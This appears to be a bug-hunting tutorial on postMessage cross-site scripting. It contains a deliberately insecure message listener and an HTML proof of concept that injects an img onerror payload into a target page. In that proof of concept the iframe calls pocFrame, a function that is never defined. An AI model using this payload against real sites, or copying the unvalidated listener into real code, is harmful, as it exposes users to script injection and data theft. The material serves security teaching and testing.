# **PostMessage XSS (Cross-Site Scripting) Vulnerability**

## **Introduction**
The `postMessage` API is widely used in modern web applications to enable cross-origin communication between different windows, iframes, and pop-ups. However, **if the receiving application does not properly validate the origin of incoming messages**, it may be vulnerable to **PostMessage XSS**.

This vulnerability allows attackers to send malicious data from an **untrusted source (e.g., sandboxed iframe, null origin, or malicious website)** to a trusted application, leading to **security risks such as data theft, session hijacking, and arbitrary JavaScript execution.**

---

## **How PostMessage Works**
The `window.postMessage()` function allows scripts running in one window to send messages to another window. The syntax is:

```javascript
window.postMessage(message, targetOrigin, [transfer]);
```

- `message`: The data to be sent to the target window.
- `targetOrigin`: A string specifying the expected origin of the recipient (use `"*"` to allow any origin, which is insecure).
- `transfer`: Optional, used for passing objects.

Example of secure usage:
```javascript
window.postMessage("data", "https://trusted-site.com");
```

---

## **Vulnerability: Improper Origin Validation**
If an application listens for `postMessage` events **without verifying the sender’s origin**, an attacker can exploit this by crafting a malicious message from an unauthorized source.

### **Example of an Insecure Implementation**
```javascript
window.addEventListener("message", function (event) {
    // No origin validation
    document.body.innerHTML = event.data;
});
```
**Security Issue:**  
- The application directly processes any received message without verifying the sender's origin.
- If an attacker sends a malicious payload (e.g., JavaScript injection), it can lead to XSS.

### **Exploitation Scenario**
1. The vulnerable website listens for messages using `postMessage`, but **does not check the sender’s origin**.
2. An attacker hosts a malicious page and sends a **crafted message** to the vulnerable application.
3. The malicious script gets executed inside the vulnerable website, leading to **DOM-based XSS**.

---

## **Exploiting PostMessage XSS**

### **Proof of Concept (PoC)**
The following PoC demonstrates how an attacker can inject malicious JavaScript into a vulnerable application by exploiting a poorly validated `postMessage` request.

```html
<!doctype html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>PostMessage XSS PoC</title>
    <script>
        function pocLink() {
            var ref = window.open('https://vulnerable-website.com'); // Open target
            ref.postMessage("<img src=x onerror=alert('XSS Exploited')>", "https://vulnerable-website.com");
        }
    </script>
</head>
<body>
    <a href="#" onclick="pocLink();">Click to Exploit</a>          
    <iframe src="https://vulnerable-website.com" onload="pocFrame(this.contentWindow)"></iframe>                    
</body>
</html>
```

### **Breakdown of the Attack**
- The script opens the target **vulnerable website** in a new window (`window.open()`).
- It **sends a malicious payload** via `postMessage()` that contains an XSS injection.
- If the application **does not validate the message origin**, the payload executes, triggering **arbitrary JavaScript execution**.

---

## **Impact of PostMessage XSS**
An attacker exploiting this vulnerability can:
- **Execute malicious JavaScript** on the vulnerable application.
- **Steal sensitive data** such as session tokens, authentication credentials, or user inputs.
- **Modify page content** or inject phishing links.
- **Bypass Same-Origin Policy (SOP)** by controlling a trusted domain’s behavior.
- **Perform clickjacking attacks** by embedding the site in an iframe.

---
*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*
